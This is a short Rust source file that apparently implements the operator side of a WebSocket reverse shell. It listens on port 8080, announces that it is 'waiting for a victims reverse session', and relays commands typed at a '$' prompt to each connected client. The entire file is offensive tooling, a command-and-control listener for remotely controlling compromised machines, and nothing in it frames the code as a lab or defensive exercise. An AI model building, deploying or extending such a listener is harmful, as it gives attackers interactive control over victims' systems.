extern crate ws;

use std::io::{stdin, stdout, Write};
use ws::{listen, CloseCode, Handler, Message, Result, Sender};

struct Server {
    out: Sender,
}

impl Handler for Server {
    fn on_message(&mut self, msg: Message) -> Result<()> {
        println!("{}", msg.as_text().unwrap());

        let mut s = String::new();
        print!("$ ");

        let _ = stdout().flush();
        stdin().read_line(&mut s).expect("ERROR");
        if let Some('\n') = s.chars().next_back() {
            s.pop();
        }
        if let Some('\r') = s.chars().next_back() {
            s.pop();
        }
        self.out.send(s)
    }

    fn on_close(&mut self, code: CloseCode, _reason: &str) {
        match code {
            _ => println!(""),
        }
    }
}

fn main() {
    let listen_addr = "127.0.0.1:8080";
    println!("waiting for a victims reverse session..");
    listen(&listen_addr, |out| Server { out: out })
        .unwrap_or_else(|e| panic!("Could not listen for incomming connections: {:?}", e))
}
